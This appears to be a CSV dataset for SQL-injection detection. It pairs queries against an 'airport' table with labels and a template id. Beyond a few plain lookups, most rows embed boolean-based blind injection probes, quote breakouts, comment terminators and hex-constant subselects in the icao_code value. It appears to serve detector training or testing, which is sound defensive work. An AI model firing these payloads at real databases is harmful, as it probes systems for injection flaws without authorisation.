full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT * FROM airport WHERE icao_code = ""AGBT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""7020"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT.""(()(.)'."";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'UuSLnH<'"">EBLJAr"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') AND 1376=5666-- YRHU"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') AND 1472=1472-- fUfs"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' AND 3044=3230-- FhJc"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' AND 1472=1472-- XlES"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" AND 7392=6608-- suep"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" AND 1472=1472-- wjMV"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') AND 2415=7372 AND ('lBqZ'='lBqZ"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') AND 1472=1472 AND ('Rstu'='Rstu"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT')) AND 5271=8949 AND (('Kgjb'='Kgjb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT')) AND 1472=1472 AND (('dRSg'='dRSg"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'))) AND 8481=7992 AND ((('GWbi'='GWbi"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'))) AND 1472=1472 AND ((('hKdu'='hKdu"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' AND 9438=4322 AND 'oQfF'='oQfF"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' AND 1472=1472 AND 'DwKa'='DwKa"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') AND 3200=8010 AND ('XmTC' LIKE 'XmTC"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') AND 1472=1472 AND ('KGAI' LIKE 'KGAI"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT')) AND 5825=6337 AND (('BjOC' LIKE 'BjOC"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT')) AND 1472=1472 AND (('qgFk' LIKE 'qgFk"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'))) AND 2624=1208 AND ((('nLbN' LIKE 'nLbN"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'))) AND 1472=1472 AND ((('qtbN' LIKE 'qtbN"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT%' AND 1681=5671 AND 'KFgl%'='KFgl"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT%' AND 1472=1472 AND 'ASxn%'='ASxn"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' AND 3880=2685 AND 'AlyA' LIKE 'AlyA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' AND 1472=1472 AND 'BmOW' LIKE 'BmOW"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"") AND 4722=2570 AND (""PNkz""=""PNkz"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"") AND 1472=1472 AND (""KIgg""=""KIgg"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"")) AND 6163=7616 AND ((""bXLO""=""bXLO"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"")) AND 1472=1472 AND ((""yoyG""=""yoyG"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT""))) AND 5185=1353 AND (((""QqDV""=""QqDV"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT""))) AND 1472=1472 AND (((""wudj""=""wudj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" AND 4634=3161 AND ""joaV""=""joaV"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" AND 1472=1472 AND ""guTm""=""guTm"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"") AND 2287=4094 AND (""EzWh"" LIKE ""EzWh"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"") AND 1472=1472 AND (""KAIY"" LIKE ""KAIY"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"")) AND 9152=7810 AND ((""DqLw"" LIKE ""DqLw"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"")) AND 1472=1472 AND ((""ZAws"" LIKE ""ZAws"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT""))) AND 7558=3370 AND (((""dszv"" LIKE ""dszv"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT""))) AND 1472=1472 AND (((""obnS"" LIKE ""obnS"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" AND 9017=8633 AND ""gVIb"" LIKE ""gVIb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" AND 1472=1472 AND ""UQQL"" LIKE ""UQQL"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' AND 4116=4080 OR 'EpsB'='Oscj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' AND 1472=1472 OR 'nXBi'='LHeO"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') WHERE 2623=2623 AND 8006=3269-- cPkC"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') WHERE 8608=8608 AND 1472=1472-- UYMF"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"") WHERE 1261=1261 AND 4688=8207-- ZwtE"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"") WHERE 8050=8050 AND 1472=1472-- OLQm"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' WHERE 4932=4932 AND 4622=9172-- AeHc"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' WHERE 4185=4185 AND 1472=1472-- jEzG"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" WHERE 3267=3267 AND 9534=8061-- tEXL"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" WHERE 1145=1145 AND 1472=1472-- blpX"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'||(SELECT 0x62457442 WHERE 3739=3739 AND 3669=2584)||'"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'||(SELECT 0x414c744b WHERE 7245=7245 AND 1472=1472)||'"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'||(SELECT 0x66615378 FROM DUAL WHERE 1153=1153 AND 8150=3476)||'"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'||(SELECT 0x54707853 FROM DUAL WHERE 8177=8177 AND 1472=1472)||'"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'+(SELECT 0x72646c48 WHERE 3893=3893 AND 5667=8888)+'"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT'+(SELECT 0x48725864 WHERE 4851=4851 AND 1472=1472)+'"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT||(SELECT 0x757a4e48 FROM DUAL WHERE 4493=4493 AND 7234=5526)||"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT||(SELECT 0x42704f6a FROM DUAL WHERE 7917=7917 AND 1472=1472)||"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT||(SELECT 0x746f7576 WHERE 6414=6414 AND 6687=4806)||"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT||(SELECT 0x7350416d WHERE 6424=6424 AND 1472=1472)||"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT+(SELECT 0x4e4d6e56 WHERE 3720=3720 AND 7817=3300)+"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT+(SELECT 0x6c6e4d55 WHERE 9935=9935 AND 1472=1472)+"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT')) AS IjcQ WHERE 5000=5000 AND 1720=3639-- tekL"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT')) AS vZHr WHERE 2119=2119 AND 1472=1472-- CInA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"")) AS QsZW WHERE 2740=2740 AND 7369=2576-- SvSy"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"")) AS jcIR WHERE 7889=7889 AND 1472=1472-- Ralf"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') AS XGzL WHERE 7669=7669 AND 6317=9772-- atVJ"";",1,airport-S1,Unknown,Unknown
